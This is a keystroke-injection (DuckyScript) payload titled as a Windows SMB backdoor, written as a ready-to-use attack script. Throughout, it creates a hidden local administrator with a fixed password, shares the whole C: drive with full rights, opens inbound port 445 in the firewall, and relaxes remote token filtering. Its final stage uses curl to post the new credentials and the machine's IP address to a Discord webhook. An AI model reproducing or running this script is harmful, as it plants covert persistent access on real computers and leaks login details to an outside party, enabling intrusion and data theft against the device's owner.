REM #
REM # Title:            "Microsoft Windows" SMB Backdoor
REM #
REM # Description:      
REM #                   1) Adds a user account (f1ch3u5:passw@rd).
REM #                   2) Adds this local user to local administrator group.
REM #                   3) Shares "C:" directory (RD_SHARE).
REM #                   4) Adds a rule to the firewall.
REM #                   5) Sets a value to "LocalAccountTokenFilterPolicy" to access the "C:" with a local account.
REM #                   6) Hides this user account.
REM #
REM # Author:           F1CH3U5
REM # Version:          5.0
REM # Category:         Remote Access
REM # Target:           Microsoft Windows
REM #
REM # TESTED ON
REM # ===============
REM # Microsoft Windows 10 Family Version 20H2 (PowerShell 5.1)
REM # Microsoft Windows 10 Professional Version 20H2 (PowerShell 5.1)
REM #
REM # REQUIREMENTS
REM # ===============
REM # The target user must belong to the 'Administrators' group.
REM #

REM ######## INITIALIZATION ########

DELAY 1000

REM ######## STAGE1 ########

GUI r
DELAY 3000
STRING cmd
DELAY 3000
CTRL-SHIFT ENTER
DELAY 3000
LEFTARROW
DELAY 1000
ENTER
DELAY 1000

REM ######## STAGE2 ########

STRING NET USER f1ch3u5 passw@rd /ADD
ENTER
DELAY 1000

STRING NET LOCALGROUP Administradores f1ch3u5 /ADD
ENTER
DELAY 1000

REM ######## STAGE3 ########

STRING NET SHARE RD_SHARE=C:\ /GRANT:f1ch3u5,FULL /REMARK:"RRemote DShare"
ENTER
DELAY 1000

STRING NETSH ADVFIREWALL FIREWALL ADD RULE NAME="Server Message Block for RD" PROTOCOL=TCP LOCALPORT=445 DIR=IN ACTION=ALLOW PROFILE=PUBLIC,PRIVATE,DOMAIN
ENTER
DELAY 1000

REM ######## STAGE4 ########

STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
ENTER
DELAY 1000

STRING REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /f /v f1ch3u5 /t REG_DWORD /d 0
ENTER
DELAY 1000
STRING echo "Dispositivo POWNED user: f1ch3u5 passw: passw@rd" > mensaje.txt
ENTER

DELAY 500
STRING curl -X POST -H "Content-Type: multipart/form-data" -F "file=@mensaje.txt" https://discord.com/api/webhooks/1207070011911573655/wPa1jrvnGusQ5vfh9TGB2qtNdwbuvgRqnnEP31UbROyoRJjyg_YrC_HhH2wNuY3MI7LV
DELAY 500
ENTER
DELAY 1000

STRING for /f "tokens=2 delims=:" %i in ('ipconfig ^| findstr /i "IPv4"') do @set ip=%i && curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"IP de la interfaz WiFi es: %ip%\"}" https://discord.com/api/webhooks/1207070011911573655/wPa1jrvnGusQ5vfh9TGB2qtNdwbuvgRqnnEP31UbROyoRJjyg_YrC_HhH2wNuY3MI7LV
DELAY 500
ENTER
DELAY 1500


ENTER
DELAY 1000

REM ######## FINISH ########

STRING EXIT
ENTER


